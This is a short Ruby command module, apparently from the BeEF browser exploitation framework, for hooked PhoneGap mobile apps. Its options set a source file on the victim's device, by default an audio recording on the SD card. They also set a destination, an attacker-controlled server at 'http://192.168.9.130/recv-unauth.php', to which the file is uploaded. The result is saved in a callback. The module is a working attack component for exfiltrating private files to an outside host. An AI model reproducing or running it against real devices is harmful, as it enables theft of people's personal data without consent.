# phonegap
#

class File_upload < BeEF::Core::Command
  
    def self.options
        return [{
            'name' => 'file_upload_dst', 
            'description' => 'Upload a file from device to your server', 
            'ui_label'=>'detination', 
            'value' => 'http://192.168.9.130/recv-unauth.php',
            'width' => '300px'
            },{
            'name' => 'file_upload_src',    
            'description' => 'path to file on device', 
            'ui_label'=>'file path', 
            'value' => '/sdcard/myrecording.wav',
            'width' => '300px'
            }]
  end

  def callback
    content = {}
    content['Result'] = @datastore['result']
    save content

  end 
end
